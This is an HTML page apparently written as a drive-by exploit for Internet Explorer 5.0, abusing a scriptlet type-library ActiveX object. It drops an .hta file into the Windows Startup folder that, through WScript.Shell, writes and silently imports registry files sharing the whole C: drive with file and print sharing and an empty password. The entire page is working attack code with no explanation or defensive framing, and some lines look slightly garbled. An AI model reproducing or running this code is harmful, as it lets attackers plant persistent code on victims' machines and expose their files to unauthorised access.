<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <title>Executing programs with IE 5.0 using  "Object for constructing type libraries for scriptlets".
</title>
</head>
<body>
<object id="scr"
   classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"
>
</object> 
<script>
scr.Reset();
scr.Path="C:\\WINNT\\Profiles\\Default User\\Start Menu\\Programs\\Startup\\windowsNT.hta";
scr.Doc="<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object><SCRIPT>;wsh.Run('cmd /c echo REGEDIT4 
>> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Network\LanMan\C]>> C:\\winfree1.reg',true,1);wsh.Run('cmd /c echo "FileSharing"="Yes">> C:\\winfree1.reg',true,1);wsh.Run('cmd /c echo "PrintSharing"="Yes">> C:\\winfree1.reg',true,1);wsh.Run('cmd /c REGEDIT /s winfree1.reg 
',true,1);wsh.Run('cmd /c echo REGEDIT4 
>> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C]>> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo "Flags"=dword:00000101>> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo "Type"=dword:00000000>> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo "Path"="C:\\">> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo "Parm2enc"=hex:>> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo "Parm1enc"=hex:>> C:\\winfree.reg',true,1);wsh.Run('cmd /c echo "Remark"="FREE_JCzic">> C:\\winfree.reg',true,1);wsh.Run('cmd /c REGEDIT /s winfree1.reg 
',true,1);wsh.Run('cmd /c REGEDIT /s winfree.reg 
',true,1)</"+"SCRIPT>";
scr.write();


</script>
</body>
</html>
